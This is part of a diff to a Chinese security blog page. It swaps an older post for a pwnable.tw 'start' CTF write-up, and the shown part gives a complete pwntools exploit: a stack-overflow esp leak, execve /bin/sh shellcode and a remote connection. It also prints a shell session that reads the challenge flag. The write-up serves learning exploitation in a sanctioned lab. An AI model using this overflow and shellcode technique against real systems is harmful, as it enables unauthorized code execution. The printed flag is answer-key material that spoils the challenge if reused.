+<p>使用asm(shellcode)来进行汇编,可以使用context来指定cpu类型以及操作系统，如context(arch = ‘amd64’ , os = ‘linux’, log_level=”debug”)</p>
+<h3 id="Catch-THE-FLAG"><a href="#Catch-THE-FLAG" class="headerlink" title="Catch THE FLAG"></a>Catch THE FLAG</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">'''</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">push eax</span></span><br><span class="line"><span class="string">push %s</span></span><br><span class="line"><span class="string">push %s</span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">mov al, 0xb</span></span><br><span class="line"><span class="string">int 0x80'''</span> %(u32(<span class="string">'/sh\0'</span>),u32(<span class="string">'/bin'</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">()</span>:</span></span><br><span class="line">    p = process(<span class="string">'./start'</span>)</span><br><span class="line">    context.terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    gdb.attach(proc.pidof(p)[<span class="number">0</span>])</span><br><span class="line">    pause()</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_esp</span><span class="params">(p)</span>:</span></span><br><span class="line">    start = p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x14</span> + p32(<span class="number">0x08048087</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    saved_esp = p.recv()[:<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">return</span> u32(saved_esp)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(p,saved_esp)</span>:</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x14</span> + p32(saved_esp + <span class="number">20</span>) + asm(shellcode)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># p = dbg()</span></span><br><span class="line">    <span class="comment"># p = process("./start")</span></span><br><span class="line">    p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10000</span>)</span><br><span class="line">    saved_esp = leak_esp(p)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"leak saved_esp: %s"</span> %hex(saved_esp+<span class="number">20</span>)</span><br><span class="line">    pwn(p,saved_esp)</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> python ./start.py</span><br><span class="line">[+] Opening connection to chall.pwnable.tw on port 10000: Done</span><br><span class="line">leak saved_esp: 0xffb43704</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"><span class="meta">$</span> whoami</span><br><span class="line">start</span><br><span class="line"><span class="meta">$</span> find -name flag</span><br><span class="line">./home/start/flag</span><br><span class="line"><span class="meta">$</span> cat ./home/start/flag</span><br><span class="line">FLAG&#123;Pwn4bl3_tW_1s_y0ur_st4rt&#125;</span><br></pre></td></tr></table></figure>
+<p>##</p>
+<h2 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h2><p><a href="https://introspelliam.github.io/2017/08/06/pwn/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/" target="_blank" rel="noopener">Linux 系统调用</a></p>
+<p><strong>pwntools使用</strong><br><a href="http://brieflyx.me/2015/python-module/pwntools-intro/" target="_blank" rel="noopener">http://brieflyx.me/2015/python-module/pwntools-intro/</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/</a><br><a href="https://tianstcht.github.io/pwntools%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/" target="_blank" rel="noopener">https://tianstcht.github.io/pwntools%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</a></p>
 
       
     </div>
@@ -513,9 +625,11 @@
       
         <div class="post-tags">
           
-            <a href="/tags/itchat/" rel="tag"># itchat</a>
+            <a href="/tags/二进制/" rel="tag"># 二进制</a>
           
-            <a href="/tags/微信/" rel="tag"># 微信</a>
+            <a href="/tags/Linux/" rel="tag"># Linux</a>
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
           
         </div>
       
@@ -528,8 +642,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/03/16/小米固件工具mkxqimage/" rel="next" title="小米固件工具mkxqimage">
-                <i class="fa fa-chevron-left"></i> 小米固件工具mkxqimage
+              <a href="/2019/07/25/Debug-a-router-firmware/" rel="next" title="远程调试小米路由器固件">
+                <i class="fa fa-chevron-left"></i> 远程调试小米路由器固件
               </a>
             
           </div>
@@ -537,10 +651,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/03/25/Samba-CVE/" rel="prev" title="某厂商路由器与Samba漏洞CVE-2017-7494">
-                某厂商路由器与Samba漏洞CVE-2017-7494 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -708,7 +818,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#大杀器itchat"><span class="nav-text">大杀器itchat</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#introduction"><span class="nav-text">introduction</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#初步尝试"><span class="nav-text">初步尝试</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实现定时转发"><span class="nav-text">实现定时转发</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#添加周期防掉线"><span class="nav-text">添加周期防掉线</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#把程序放在服务器上"><span class="nav-text">把程序放在服务器上</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#遇到的坑"><span class="nav-text">遇到的坑</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#线程阻塞问题"><span class="nav-text">线程阻塞问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#找不到群组"><span class="nav-text">找不到群组</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二维码显示不全"><span class="nav-text">二维码显示不全</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwnable-tw-start"><span class="nav-text">Pwnable.tw start</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-检查保护情况"><span class="nav-text">0x01 检查保护情况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-漏洞分析"><span class="nav-text">0x02 漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#INT-80h-系统调用方法"><span class="nav-text">INT 80h 系统调用方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#栈变化情况"><span class="nav-text">栈变化情况</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-漏洞利用"><span class="nav-text">0x03 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用思路"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Catch-THE-FLAG"><span class="nav-text">Catch THE FLAG</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#REF"><span class="nav-text">REF</span></a></li></ol></li></ol></div>
             
 
           </div>
